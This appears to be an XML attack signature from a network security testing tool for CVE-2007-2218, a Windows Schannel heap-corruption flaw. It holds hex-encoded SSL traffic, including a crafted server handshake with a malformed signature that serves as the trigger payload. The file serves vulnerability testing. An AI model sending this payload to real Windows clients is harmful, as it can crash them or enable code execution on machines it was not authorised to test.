<?xml version="1.0" encoding="utf-8"?>
<threatSignature>
  <ThreatProperties>
    <ExecDesc display="true" value="Microsoft Windows Schannel Security Package Code Execution Vulnerability"/>
    <EngDesc display="true" value="There exists a heap corruption vulnerability in the way Windows Schannel on a client machine validates server-sent digital signatures. The vulnerability is due to insufficient checks performed on server-sent digital signatures during SSL handshakes. Remote attackers can exploit this vulnerability by persuading target users to visit a specially crafted Web site. Successful exploitation would allow the attacker to execute arbitrary code on the target system with the privileges of the System level privileges."/>
    <Intent display="true">
      <item value="MEMORY_CORRUPTION"/>
    </Intent>
    <Protocol display="true" value="HTTP"/>
    <Type_Of_Equipment display="true">
      <item value="Application"/>
    </Type_Of_Equipment>
    <Known_Vendors_Affected display="true">
      <item value="Microsoft"/>
    </Known_Vendors_Affected>
    <Known_Products_Affected display="true">
      <item value="Microsoft_Windows"/>
      <item value="Microsoft_Windows_Server_2003"/>
    </Known_Products_Affected>
    <Known_Versions_Affected display="true">
      <item value="Microsoft_Windows_2000"/>
      <item value="Microsoft_Windows_XP"/>
      <item value="Microsoft_Windows_Server_2003"/>
    </Known_Versions_Affected>
    <Credit display="true" value="FSC20070612-09"/>
    <CVEID display="true" value="CVE-2007-2218"/>
    <bugtraqID display="true" value="24416"/>
    <OSVDB display="true" value=""/>
    <Author display="true" value="Mike Davis"/>
    <ID display="true" value="7789bbcf21fb9773af11f4cd704cf775"/>
    <Revision display="true" value="1"/>
    <Safe display="true" value="true"/>
    <ServerSideAttack display="true" value="false"/>
    <SoftwareRevision display="true" value="2.0"/>
    <Suite display="true" value="Standard"/>
    <RunOnce display="false" value="false"/>
    <Valid_Traffic display="false" value="True"/>
    <AccessVector display="false" value="remote"/>
    <AccessComplexity display="false" value="low"/>
    <Authentication display="false" value="not-required"/>
    <ConfImpact display="false" value="complete"/>
    <IntegImpact display="false" value="complete"/>
    <AvailImpact display="false" value="complete"/>
    <ImpactBias display="false" value="normal"/>
    <FirstAdded display="false" value="normal"/>
    <LastModified display="false" value="633356763032031250"/>
    <SigStyle display="false" value=""/>
    <targetNode display="false" value="B"/>
    <SigProtocol display="false" value=""/>
    <Rate display="false" value="1"/>
    <Regex display="false" value=""/>
    <Created value="1204095326" display="true"/>
  </ThreatProperties>
  <Variables>
    <NamedVar name="sourceMAC" type="ImperfectControls.MacAddress" value="null" index="A"/>
    <NamedVar name="destMAC" type="ImperfectControls.MacAddress" value="null" index="B"/>
    <NamedVar name="sourceIP" type="ImperfectControls.IPv4Address" value="null" index="C"/>
    <NamedVar name="destIP" type="ImperfectControls.IPv4Address" value="null" index="D"/>
    <NamedVar name="HTTPdestPort" type="ImperfectControls.Port" value="null" index="Z"/>
  </Variables>
  <Loops>
    <for index="E">
      <for index="A"/>
      <for index="B"/>
      <for index="C"/>
      <for index="D"/>
    </for>
    <for index="F">
      <for index="A"/>
      <for index="B"/>
      <for index="C"/>
      <for index="D"/>
    </for>
  </Loops>
  <PostScript/>
  <Output index="E" Count="">
    <Ethernet srcMac="$sourceMAC" destMac="$destMAC" pktType="0800">
      <IP Version="4" InternetHeaderLength="" TypeofService="" TotalLength="" Identification="" FragmentOffset="" TTL="" Protocol="06" HeaderChecksum="" srcIP="$sourceIP" destIP="$destIP" options="" CE="" DF="" MF="">
        <TCP srcPort="@random(1026,65535)" destPort="$HTTPdestPort" SeqNumber="" AckNumber="" HeaderLength="" WindowSize="" Checksum="" UrgentPointer="" Options="" Payload="804C01030000330000001000000400000500000A0100800700C00300800000090600400000640000620000030000060200800400800000130000120000638E6A95075DEA49EE10E7DE7E9B5D7731" CWR="" ECE="" URG="" ACK="" PSH="" RST="" SYN="" FIN="" RES1="" RES2="" RES3="" RES4=""/>
      </IP>
    </Ethernet>
  </Output>
  <Input>
    <Ethernet/>
  </Input>
  <ServerSide display="1">
    <Output index="F" Count="">
      <Ethernet srcMac="" destMac="" pktType="">
        <IP Version="4" InternetHeaderLength="" TypeofService="" TotalLength="" Identification="" FragmentOffset="" TTL="" Protocol="" HeaderChecksum="" srcIP="" destIP="" options="" CE="" DF="" MF="">
          <TCP srcPort="" destPort="" SeqNumber="" AckNumber="" HeaderLength="" WindowSize="" Checksum="" UrgentPointer="" Options="" Payload="000000000000160300004A020000460300466EFEBBA5E4DDF1ECAD711911A85121EA9CDB8B9DF6EA4FF4BA66914D0D63B22074C385C54A98453A819607B70375A25C8E3DB8ABAB2B2721C381840DA72E379700040016030002FF0B0002FB0002F80002F5308202F13082025AA0030201020202011E300D06092A864886F70D0101050500307E310B3009060355040613024341310B3009060355040813024F4E3110300E06035504071307544F524F4E544F3111300F060355040A13084153535552454E54310C300A060355040B1303565254310D300B06035504031304746573743120301E06092A864886F70D010901161174657374406173737572656E742E636F6D301E170D3036303932333131343931345A170D3037303932333131343931345A308180310B3009060355040613024341310B3009060355040813024F4E3110300E06035504071307544F524F4E544F3111300F060355040A13084153535552454E54310C300A060355040B1303565254310E300C0603550403130574657374313121301F06092A864886F70D01090116127465737431406173737572656E742E636F6D30819F300D06092A864886F70D010101050003818D0030818902818100B4D8AE31A3928765EB15B7D1E89AC1A94FF2A103B16B16DEB471CA982B6EF3A84D12A5088BF1920405D80866C0B13CC3D5D5BB38DF07C55459CD787181B3F9282AD7A71C2A4C9E59539119C7F132282B39AE505A0D7C7EDF9673AA855BE3AB15AB1EF369AB5B0CA07B05F518F6DB435E2B0E45EDDCF7835A6481A1F4D36231F30203010001A37B307930090603551D1304023000302C06096086480186F842010D041F161D4F70656E53534C2047656E657261746564204365727469666963617465301D0603551D0E041604148135B21C9B9DFB6EF48BA3A60B9FB8B2B317799E301F0603551D230418301680149E0050453CEE9FEE4777B78870B3175523319ACE300D06092A864886F70D01010505000381810006F26DF193D1854EA64F91314227948B32EDEA6319C4416A37F126846B07E31118FA000FD2600140F638DD2341B9C106C53266C434196F3674C34F1D74B69D3625876CBAF2A7C4A09C44622359E713388A0139E4AC5DA9BCA64728D7EFE2719BDFEEC7587E3C4DFE7143881B15470A69A2A72D2FAAE7B432E994CA85E16E735816030000530C00004F0040000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000001000000FF0000000000000016030000040E000000000000000000000000000000" CWR="" ECE="" URG="" ACK="" PSH="" RST="" SYN="" FIN="" RES1="" RES2="" RES3="" RES4=""/>
        </IP>
      </Ethernet>
    </Output>
  </ServerSide>
</threatSignature>
